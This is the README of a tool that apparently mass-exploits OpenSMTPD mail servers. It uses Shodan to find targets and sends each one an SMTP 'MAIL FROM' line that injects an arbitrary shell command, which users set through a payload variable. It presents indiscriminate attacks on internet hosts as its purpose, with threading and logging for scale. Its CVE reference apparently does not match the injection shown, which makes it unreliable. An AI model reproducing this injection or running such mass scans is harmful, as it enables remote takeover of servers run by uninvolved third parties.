# OpenSMTPD
A mass exploitation tool for CVE 2020-8793 

----------------------------------------------------------------------------------

# Info

The Shodan API to find vulnerable devices and mass sends a payload to the target

To customize the payload :

s.send(bytes(f'MAIL FROM:<;{payload};>\r\n', 'utf-8'))

Change the variable 'payload' to your desired payload 

----------------------------------------------------------------------------------


# TODO

- [x] Release Main Code
- [X] Add Threading
- [x] Add Payload Input
- [x] Make Error Outputs
- [x] Make Time Logs

----------------------------------------------------------------------------------

# Systems

- Tested Systems:
  - Parrot OS Home
  - Kali Linux Mate
  - Windows 10
  - Windows 7
  - Ubuntu 20.1

----------------------------------------------------------------------------------

# Example

![Example](https://i.imgur.com/CYeopPK.png)
